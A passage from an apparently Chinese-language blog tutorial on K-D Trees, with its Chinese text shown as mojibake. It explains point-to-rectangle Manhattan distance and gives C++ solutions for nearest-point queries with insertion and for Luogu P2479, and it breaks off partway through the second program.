<p>æœ¬é¢˜æœ‰æ’å…¥æ“ä½œï¼Œä¸èƒ½é™æ€å»ºæ ‘ï¼Œéœ€è¦è€ƒè™‘æ’å…¥æ–°ç‚¹åæ˜¯å¦é‡æ„ã€‚</p>
<p>ç°åœ¨è€ƒè™‘å¦‚ä½•æŸ¥è¯¢ï¼Œå…¶å®å°±æ˜¯ä¸Šé¢é‚£ä¸ªè¿‡ç¨‹ï¼Œä¸»è¦éš¾ç‚¹åœ¨å¦‚ä½•æ±‚å‡ºæŸä¸ªç‚¹åˆ°çŸ©å½¢çš„æ›¼å“ˆé¡¿è·ç¦»ã€‚</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/7mfele5v.png"></p>
<p>çœ‹è¿™å¼ ç¾ä¸½çš„å›¾ï¼Œå‡è®¾ $A,B$ æ˜¯æˆ‘ä»¬ç»™å‡ºçš„æŸ¥è¯¢ç‚¹ï¼Œè¿™ä¸ªçŸ©å½¢æ˜¯æŸä¸ªå­æ ‘æ‰€ç®¡è¾–çš„çŸ©å½¢ï¼Œçœ‹å›¾ç¨å¾®æ¨ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è®¡ç®—å®ƒä»¬çš„è·ç¦»ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">dismatrix</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//(X,Y)ä¸ºæŸ¥è¯¢ç‚¹</span></span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	res+=<span class="built_in">max</span>(<span class="number">0</span>,X-t[p].mx[<span class="number">0</span>])+<span class="built_in">max</span>(<span class="number">0</span>,t[p].mn[<span class="number">0</span>]-X);</span><br><span class="line">	res+=<span class="built_in">max</span>(<span class="number">0</span>,Y-t[p].mx[<span class="number">1</span>])+<span class="built_in">max</span>(<span class="number">0</span>,t[p].mn[<span class="number">1</span>]-Y);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºæ›´é«˜ç»´çš„ï¼Œæˆ‘ä»¬ç»™å‡ºè¿™æ ·ä¸€ä¸ªå…¬å¼</p>
<p>$dist(T,P)&#x3D;\sum_{i&#x3D;0}^{K-1}max(0,T_i-P_{mx_i})+max(0,P_{mn_i}-T_i)$</p>
<p>$T$ ä¸ºæŸ¥è¯¢ç‚¹ï¼Œ$P$ ä¸ºçŸ©å½¢ï¼Œ$K$ä¸ºç»´åº¦ã€‚</p>
<p>å®Œæ•´ä»£ç  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> K=<span class="number">0</span>,cur=<span class="number">0</span>,cnt=<span class="number">0</span>,X,Y,ans;</span><br><span class="line"><span class="type">double</span> A=<span class="number">0.75</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> mn[<span class="number">2</span>],mx[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> sz,ls,rs;</span><br><span class="line">&#125;t[MAX];</span><br><span class="line"><span class="type">int</span> g[MAX];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> t[a].d[K]&lt;t[b].d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[p].mx[i]=t[p].mn[i]=t[p].d[i];</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	t[p].sz=t[ls].sz+t[rs].sz+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pia</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="keyword">return</span>;</span><br><span class="line">	<span class="built_in">pia</span>(t[p].ls);</span><br><span class="line">	g[++cnt]=p;</span><br><span class="line">	<span class="built_in">pia</span>(t[p].rs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rebuild</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">nth_element</span>(g+l,g+mid,g+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[g[mid]].ls=<span class="built_in">rebuild</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[g[mid]].rs=<span class="built_in">rebuild</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(g[mid]);</span><br><span class="line">	<span class="keyword">return</span> g[mid];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">if</span>(t[p].sz*A&lt;<span class="built_in">max</span>(t[ls].sz,t[rs].sz))</span><br><span class="line">	&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">pia</span>(p);</span><br><span class="line">		p=<span class="built_in">rebuild</span>(<span class="number">1</span>,cnt,k);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> &amp;p,node temp,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)</span><br><span class="line">	&#123;</span><br><span class="line">		p=++cur;</span><br><span class="line">		t[p]=temp;</span><br><span class="line">		t[p].ls=t[p].rs=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">update</span>(p);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp.d[k]&lt;=t[p].d[k])<span class="built_in">insert</span>(t[p].ls,temp,k^<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">insert</span>(t[p].rs,temp,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(p);</span><br><span class="line">	<span class="built_in">check</span>(p,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dismatrix</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	res+=<span class="built_in">max</span>(<span class="number">0</span>,X-t[p].mx[<span class="number">0</span>])+<span class="built_in">max</span>(<span class="number">0</span>,t[p].mn[<span class="number">0</span>]-X);</span><br><span class="line">	res+=<span class="built_in">max</span>(<span class="number">0</span>,Y-t[p].mx[<span class="number">1</span>])+<span class="built_in">max</span>(<span class="number">0</span>,t[p].mn[<span class="number">1</span>]-Y);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dis</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">abs</span>(t[p].d[<span class="number">0</span>]-X)+<span class="built_in">abs</span>(t[p].d[<span class="number">1</span>]-Y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ans=<span class="built_in">min</span>(ans,<span class="built_in">dis</span>(p));</span><br><span class="line">	<span class="type">int</span> disls=<span class="number">1e9</span>;</span><br><span class="line">	<span class="type">int</span> disrs=<span class="number">1e9</span>;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)disls=<span class="built_in">dismatrix</span>(t[p].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)disrs=<span class="built_in">dismatrix</span>(t[p].rs);</span><br><span class="line">	<span class="keyword">if</span>(disls&lt;disrs)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(disls&lt;ans)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">		<span class="keyword">if</span>(disrs&lt;ans)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(disrs&lt;ans)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">		<span class="keyword">if</span>(disls&lt;ans)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//freopen(&quot;tmp.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">	<span class="comment">//freopen(&quot;tmp.out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">	<span class="type">int</span> n,m,root=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">read</span>(n),<span class="built_in">read</span>(m);</span><br><span class="line">	<span class="type">int</span> opt;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		node temp;</span><br><span class="line">		<span class="built_in">read</span>(temp.d[<span class="number">0</span>]),<span class="built_in">read</span>(temp.d[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">insert</span>(root,temp,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">read</span>(opt);</span><br><span class="line">		<span class="keyword">if</span>(opt==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			node temp;</span><br><span class="line">			<span class="built_in">read</span>(temp.d[<span class="number">0</span>]),<span class="built_in">read</span>(temp.d[<span class="number">1</span>]);</span><br><span class="line">			<span class="built_in">insert</span>(root,temp,<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(opt==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">read</span>(X),<span class="built_in">read</span>(Y);</span><br><span class="line">			ans=<span class="number">1e9</span>;</span><br><span class="line">			<span class="built_in">query</span>(root);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="K-D-Treeè¿›é˜¶"><a href="#K-D-Treeè¿›é˜¶" class="headerlink" title="K-D Treeè¿›é˜¶"></a>K-D Treeè¿›é˜¶</h2><p>äº†è§£äº†k-D Treeçš„åŸºæœ¬ç”¨æ³•ï¼Œæ¥ä¸‹æ¥çœ‹ $3$ ä¸ªä¾‹é¢˜ï¼Œæ¥æå‡ä¸€ä¸‹å¯¹k-D Treeçš„ç†è§£ï¼ŒåŒæ—¶å­¦ä¹ ä¸€ä¸‹å…¶å®ƒçš„é«˜çº§æŸ¥è¯¢ã€‚</p>
<h3 id="æœ€å°æœ€å¤§è·ç¦»æœ€å°è·ç¦»å·®"><a href="#æœ€å°æœ€å¤§è·ç¦»æœ€å°è·ç¦»å·®" class="headerlink" title="æœ€å°æœ€å¤§è·ç¦»æœ€å°è·ç¦»å·®"></a>æœ€å°æœ€å¤§è·ç¦»æœ€å°è·ç¦»å·®</h3><h4 id="æ´›è°·-P2479-SDOI2010-æ‰è¿·è—"><a href="#æ´›è°·-P2479-SDOI2010-æ‰è¿·è—" class="headerlink" title="æ´›è°· P2479 [SDOI2010] æ‰è¿·è—"></a>æ´›è°· P2479 [SDOI2010] æ‰è¿·è—</h4><p>äºŒç»´å¹³é¢ä¸Šï¼Œç»™å‡º $n$ ä¸ªç‚¹ $(x,y)$ ï¼Œè¯·æ‰¾å‡ºä¸€ä¸ªç‚¹ï¼Œä½¿å¾—è¯¥ç‚¹åˆ°å…¶å®ƒç‚¹çš„æœ€å¤§è·ç¦»å’Œè¯¥ç‚¹åˆ°å…¶å®ƒç‚¹çš„æœ€å°è·ç¦»ä¹‹å·®æœ€å°ï¼Œè¾“å‡ºç¼–å·ã€‚</p>
<p><strong>æœ¬é¢˜ä¸­ï¼Œè·ç¦»æŒ‡æ›¼å“ˆé¡¿è·ç¦»</strong>ï¼Œå³ $dist(A,B)&#x3D;|A_x-B_x|+|A_y-B_y|$</p>
<p>ç”±äºæ²¡æœ‰æ’å…¥æ“ä½œï¼Œé™æ€å»ºæ ‘å³å¯ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬ç°åœ¨åªæŸ¥è¯¢æœ€å°è·ç¦»ï¼Œç›´æ¥æšä¸¾ $n$ ä¸ªç‚¹ï¼Œä¾æ¬¡æŸ¥è¯¢æœ€å°è·ç¦»å³å¯ï¼Œæ³¨æ„è¦ç»™æšä¸¾çš„è¿™ä¸ªç‚¹æ‰“ä¸ªæ ‡è®°ï¼Œåœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ä¸è¦æŸ¥è¯¢è¿™ä¸ªç‚¹ã€‚</p>
<p>æœ€å¤§è·ç¦»å…¶å®ä¹Ÿå¾ˆå®¹æ˜“è§£å†³ï¼Œå’ŒæŸ¥è¯¢æœ€å°è·ç¦»åç€æ¥å³å¯ï¼Œæ³¨æ„è¿™æ—¶æŸ¥è¯¢ç‚¹åˆ°çŸ©å½¢çš„è·ç¦»è¦å–æ›´è¿œçš„é‚£ä¸€ä¸ªï¼Œå¦åˆ™ä¼šæ¼æ‰ç­”æ¡ˆã€‚</p>
<p>éå¸¸å¥½ï¼Œé‚£å°±ç®€å•äº†ï¼Œæˆ‘ä»¬ç›´æ¥æšä¸¾ $n$ ä¸ªç‚¹ï¼ŒæŸ¥è¯¢å‡ºåˆ°æ¯ä¸ªç‚¹çš„æœ€å¤§è·ç¦»å’Œæœ€å°è·ç¦»ï¼Œç›´æ¥æ›´æ–°ç­”æ¡ˆï¼Œå³ $ans&#x3D;min(ans,maxdis-mindis)$ã€‚</p>
<p>ä»£ç å®ç°èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œç»†èŠ‚è¾ƒå¤šã€‚</p>
<p>æ”¾ä¸€ä¸‹ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e18</span>;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> K=<span class="number">0</span>,maxdis,mindis,X,Y;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ABS</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (x&lt;<span class="number">0</span>?(-x):x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>],mx[<span class="number">2</span>],mn[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> ls,rs;</span><br><span class="line">	<span class="type">bool</span> del=<span class="number">0</span>;</span><br><span class="line">&#125;t[MAX],ori[MAX];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.d[K]&lt;b.d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[p].mx[i]=t[p].mn[i]=t[p].d[i];</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">nth_element</span>(ori+l,ori+mid,ori+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[mid]=ori[mid];</span><br><span class="line">	t[mid].ls=<span class="built_in">build</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[mid].rs=<span class="built_in">build</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(mid);</span><br><span class="line">	<span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dis</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 